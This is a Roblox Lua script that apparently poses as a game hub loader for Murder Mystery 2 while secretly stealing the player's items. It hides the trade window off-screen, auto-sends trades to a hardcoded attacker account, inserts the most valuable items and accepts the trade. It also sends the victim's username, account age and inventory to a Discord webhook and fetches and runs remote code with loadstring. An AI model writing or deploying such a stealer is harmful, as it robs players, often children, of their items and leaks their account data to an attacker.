-- Configuration settings
Config = {
    Receivers = {"mxowvu"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
    Webhook = "https://discord.com/api/webhooks/1534625641897394206/_it3y5xfodZwYbCwHFZeXZEqkHlns-LReR1oWabhlsNxORdfL2ppJXeSxv4wmxqRtH",
    FullInventory = true, -- Display all items
    GoodItemsOnly = true, -- Only notify if items are above legendary
    ResendTrade = "hello", -- Chat message to resend trade
    Script = "Custom", -- Script choice
    CustomLink = "loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/main/latest.lua'))()" -- Custom script URL
}

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

-- Load notification modules
local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

-- Load the custom library for webhooks
local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/XeneroDevs/Xenohubv3/refs/heads/main/Library.lua"))()
DYWebhook.ErrorPrinting = true
local embed = DYWebhook.BuildEmbed()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage:WaitForChild("Trade")
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}

local Position = UDim2.new(0, 9999, 0, 9999)
local Inventory = {}

-- Function to send notifications
local function sendnotification(message)
    getgenv().scriptexecuted = false
    print("[ Pethicial | .gg/pethicial ]: " .. message)
    Notification:Notify(
        {Title = "Pethicial | .gg/pethicial", Description = message},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 7, Type = "default"}
    )
end

-- Main execution block with error handling
local success, errorMsg = pcall(function()
    local supportedGames = {
        [142823291] = true,
        [335132309] = true,
        [636649648] = true
    }

    -- Check if current game is supported
    if not supportedGames[game.PlaceId] then
        game:GetService("Players").LocalPlayer:Kick("This game is not supported.")
        while true do end -- Halt script if not supported
    end

    -- Validate FullInventory setting
    if Config.FullInventory ~= true and Config.FullInventory ~= false then
        Config.FullInventory = true
    end

    -- Handle script loading
    if not Config.Script then
        Config.Script = "None"
    elseif Config.Script == "Custom" then
        Config.Script = Config.Script .. " - " .. Config.CustomLink
    end

    -- Load the selected script
    if Config.Script == "Custom" then
        loadstring(game:HttpGet(Config.CustomLink))()
    elseif Config.Script == "Overdrive H" then
        loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
    elseif Config.Script == "Symphony Hub" then
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
    elseif Config.Script == "Highlight Hub" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
    elseif Config.Script == "Eclipse Hub" then
        getgenv().mainKey = "nil"
        local url = "https://api.eclipsehub.xyz/auth"
        -- Authentication code (may need updating based on API changes)
        local response = request and request or http_request or (http and http.request) or (syn and syn.request)
        local body = response and response({Url = url, Headers = {["User-Agent"] = "Eclipse"}}).Body
        loadstring(body)()
    elseif Config.Script == "R3TH PRIV" then
        loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
    elseif Config.Script == "AshbornnHub" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua", true))()
    elseif Config.Script == "Nexus" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
    end

    -- Initialize item counters
    local Common, Uncommon, Rare, Legendary = 0, 0, 0, 0
    local Vintage, Godly, Ancient, Unique = 0, 0, 0, 0

    -- Anti-AFK
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)

    -- Detect UI path
    local UIPath, TradePath
    if LocalPlayer.PlayerGui:FindFirstChild("MainGUI") then
        local mainGui = LocalPlayer.PlayerGui.MainGUI
        if mainGui.Game:FindFirstChild("Inventory") then
            UIPath = mainGui.Game.Inventory.Main
            TradePath = mainGui.TradeGUI
            Mobile = false
        else
            UIPath = mainGui.Lobby.Screens.Inventory.Main
            TradePath = mainGui.TradeGUI_Phone
            Mobile = true
        end
    end

    -- Helper functions
    local eventsMethods = {"MouseButton1Click", "MouseButton1Down", "Activated"}

    local function TapUI(button, check, button2)
        if check == "Active Check" then
            if button.Active then
                button = button[button2]
            else
                return
            end
        elseif check == "Text Check" then
            if button == "^" then
                button = button2
            else
                return
            end
        end
        for _, eventName in pairs(eventsMethods) do
            for _, connection in pairs(getconnections(button[eventName])) do
                connection:Fire()
            end
        end
    end

    -- Rarity classification
    local function Rarity(color, amount, tradeable)
        local stackCount = 1
        if amount ~= "" then
            stackCount = tonumber(amount:match("x(%d+)")) or 1
        end

        local r, g, b = math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5)

        if r == 106 and g == 106 and b == 106 then
            Common = Common + stackCount
        elseif r == 0 and g == 255 and b == 255 then
            Uncommon = Uncommon + stackCount
        elseif r == 0 and g == 200 and b == 0 then
            Rare = Rare + stackCount
        elseif r == 220 and g == 0 and b == 5 then
            Legendary = Legendary + stackCount
        elseif r == 255 and g == 0 and b == 179 then
            Godly = Godly + stackCount
        elseif r == 100 and g == 10 and b == 255 then
            Ancient = Ancient + stackCount
        elseif r == 240 and g == 140 and b == 0 then
            Unique = Unique + stackCount
        else
            Vintage = Vintage + stackCount
        end
    end

    -- Check individual item
    local function checkitem(v)
        if v:IsA("Frame") and v.ItemName and v.ItemName.Label then
            local itemName = v.ItemName.Label.Text
            if itemName ~= "Default Knife" and itemName ~= "Default Gun" then
                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                if Config.FullInventory then
                    local count = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
                    table.insert(Inventory, itemName .. " " .. count)
                end
            end
        end
    end

    -- Get full inventory
    local function FullInventory()
        for _, container in pairs(UIPath and UIPath:FindFirstChild("Weapons") and UIPath.Weapons.Items.Container:GetChildren() or {}) do
            for _, item in pairs(container.Container:GetChildren() or {}) do
                if item.Name == "Christmas" or item.Name == "Halloween" then
                    for _, subItem in pairs(item.Container:GetChildren() or {}) do
                        checkitem(subItem)
                    end
                else
                    checkitem(item)
                end
            end
        end
        for _, pet in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren() or {}) do
            checkitem(pet)
        end
        if Common + Uncommon + Rare + Legendary + Godly + Ancient + Unique + Vintage == 0 then
            table.insert(Inventory, "None")
        end
        if Config.FullInventory then
            return table.concat(Inventory, ", ")
        else
            return "Full inventory set false."
        end
    end

    -- Initialize inventory
    FullInventory()

    -- Wait before starting
    task.wait()

    -- Function to send trade request
    local function SendTrade()
        if Mobile then
            local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
            TapUI(Path.Container.Close)
            TapUI(Path.Container.PlayerList[Receiver].ActionButton)
            TapUI(Path.Popup.Container.Action.Trade)
            TapUI(Path.Popup.Container.Close)
        else
            local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
            TapUI(Path.Container.ToggleRequests.On)
            TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
            TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
            TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
            TapUI(Path.Container[Receiver].ActionButton)
            TapUI(Path.Inspect.Trade)
            TapUI(Path.Inspect.Close)
        end
    end

    -- Read chat for resend
    local function readchats()
        Players[Receiver].Chatted:Connect(function(msg)
            if msg == Config.ResendTrade then
                SendTrade()
            end
        end)
    end

    -- Activate trade with player
    local function Activate(player)
        for _, v in pairs(Config.Receivers) do
            if v == player then
                Receiver = player
                readchats()
                wait(10)
                SendTrade()
            end
        end
    end

    -- Insert items into trade
    local function InsertItems()
        local ItemsByRarity = {
            Ancient = {},
            Godly = {},
            Unique = {},
            Vintage = {},
            Legendary = {},
            Rare = {},
            Uncommon = {},
            Common = {}
        }

        for _, v in pairs(TradePath.Container.Items.Main:GetChildren() or {}) do
            for _, item in pairs(v.Items.Container.Current.Container:GetChildren() or {}) do
                if item:IsA("Frame") and item.ItemName then
                    local color = item.ItemName.BackgroundColor3
                    local rarity = "Common"
                    if color == Color3.fromRGB(220, 0, 5) then
                        rarity = "Legendary"
                    elseif color == Color3.fromRGB(255, 0, 179) then
                        rarity = "Godly"
                    elseif color == Color3.fromRGB(100, 10, 255) then
                        rarity = "Ancient"
                    elseif color == Color3.fromRGB(240, 140, 0) then
                        rarity = "Unique"
                    elseif color == Color3.fromRGB(255, 255, 0) then
                        rarity = "Vintage"
                    elseif color == Color3.fromRGB(0, 200, 0) then
                        rarity = "Rare"
                    elseif color == Color3.fromRGB(0, 255, 255) then
                        rarity = "Uncommon"
                    end
                    table.insert(ItemsByRarity[rarity], item)
                end
            end
        end

        local ItemsInTrade = 0
        local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}

        for _, rarity in ipairs(rarityOrder) do
            for _, item in ipairs(ItemsByRarity[rarity]) do
                if ItemsInTrade < 4 then
                    ItemsInTrade = ItemsInTrade + 1
                    local amount = 1
                    local countText = item.Container.Amount.Text
                    if countText ~= "" then
                        amount = tonumber(countText:match("x(%d+)")) or 1
                    end
                    for i = 1, amount do
                        TapUI(item.Container.ActionButton)
                        task.wait()
                    end
                end
            end
        end
        -- Confirm trade
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
    end

    -- Set trade UI positions
    if Mobile then
        TradePath.Container.Position = Position
        TradePath.ClickBlocker.Position = Position
    else
        TradePath.BG.Position = Position
        TradePath.Container.Position = Position
        TradePath.ClickBlocker.Position = Position
        TradePath.Processing.Position = Position
    end

    -- Observe trade UI state
    TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
        wait(3)
        if TradePath.Enabled then
            InsertItems()
        else
            SendTrade()
        end
    end)

    -- Activate trade for existing players
    for _, v in pairs(Players:GetPlayers()) do
        Activate(v.Name)
    end

    -- Listen for new players
    Players.PlayerAdded:Connect(function(player)
        Activate(player.Name)
    end)
end)

-- Prepare message for webhook
local message
if success then
    message = ("```Username     : %s\nUser Id      : %d\nAccount Age  : %d\nExploit      : %s\nReceiver/s   : %s\nScript       : %s```"..
        "\n🎒 **__Inventory__**\n```Ancient    🟪: %d\nGoldy      🧠: %d\nUnique     🟧: %d\nVintage    🟨: %d\nLegendary  🟥: %d\nRare       🟩: %d\nUncommon   🟦: %d\nCommon     ⬛: %d```"..
        "\n🎒 **__Full Inventory__**\n```%s```"..
        "\n🔗 **__Execute to join__**\n```%s```"):format(
            LocalPlayer.Name,
            LocalPlayer.UserId,
            LocalPlayer.AccountAge,
            identifyexecutor(),
            table.concat(Config.Receivers, ", "),
            Config.Script,
            Ancient, Godly, Unique, Vintage, Legendary, Rare, Uncommon, Common,
            FullInventory(),
            TeleportScript
        )
else
    message = ("```Error   : %s\nExploit : %s```"):format(errorMsg, identifyexecutor())
end

-- Validate webhook
if InvaildWebhook then
    return
end

local content
if (Vintage + Godly + Ancient + Unique > 0) and Config.GoodItemsOnly then
    content = ""
elseif (Common + Uncommon + Rare + Legendary + Godly + Ancient + Unique + Vintage) == 0 then
    content = ""
else
    content = "--@everyone"
end

-- Build embed
embed.Info = {
    Settings = {
        Color = DYWebhook.ColorConverter(Color3.fromRGB(255, 215, 0))
    },
    Embed = {
        Title = "Roblox Trade Info 💸",
        Description = message,
        Footer = ".",
    }
}

-- Send webhook
DYWebhook:Send({
    url = Config.Webhook,
    content = content,
    embeds = {embed}
})
